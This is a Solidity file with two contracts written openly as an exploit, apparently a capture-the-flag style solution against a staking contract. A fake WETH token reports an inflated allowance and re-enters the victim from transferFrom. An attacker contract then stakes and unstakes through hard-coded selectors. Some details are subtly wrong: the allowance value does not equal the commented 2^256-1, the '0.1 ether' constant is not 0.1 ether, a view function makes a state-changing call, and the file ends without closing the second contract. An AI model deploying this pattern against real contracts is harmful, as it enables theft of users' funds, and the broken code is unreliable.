pragma solidity ^0.8.0;

contract MaliciousWETH {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function allowance(address, address) external pure returns (uint256) {
        return 0x1000000000000000000000000000000000000000; // return 2^256-1
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        (bool success, ) = victim.call(abi.encodeWithSelector(0xfa604b84)); // call attack()
        return true;
    }

    fallback() external { }
}

contract WETHAttacker {
    address public immutable instance;
    address public immutable attacker;

    constructor(address _instance) {
        instance = _instance;
        attacker = msg.sender;
    }

    function attack() external {
        (bool success, ) = instance.call(abi.encodeWithSelector(0xf39fd6e5, 0x1000000000000000)); // call StakeWETH(0.1 ether)
        require(success, "StakeWETH failed");
        
        uint256 balance = myStake();
        (success, ) = instance.call(abi.encodeWithSelector(0xe6d7d45c, balance)); // call Unstake(balance)
        require(success, "Unstake failed");
    }

    function myStake() public view returns (uint256) {
        return myStakeBalance(address(this));
    }

    function myStakeBalance(address account) public view returns (uint256) {
        (bool success, bytes memory data) = 
            instance.call(abi.encodeWithSelector(0x53260e85, attacker));
        (uint256 balance) = abi.decode(data, (uint256));
        return balance;
    }

    function getBalance() external view returns (uint256) {
        return address(instance).balance;
    }